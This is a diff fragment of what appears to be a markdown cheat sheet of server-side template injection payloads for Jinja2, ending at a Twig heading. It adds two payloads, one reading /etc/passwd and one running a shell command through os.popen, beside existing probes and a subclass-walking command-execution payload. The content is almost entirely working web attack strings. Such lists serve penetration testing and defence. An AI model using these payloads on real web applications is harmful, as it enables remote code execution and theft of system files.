@@ -26,6 +26,10 @@ ${{7*7}}
 {{ config|pprint }}
 
 {{''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()[0].decode()}}
+
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 ---
 - **Twig (PHP)**
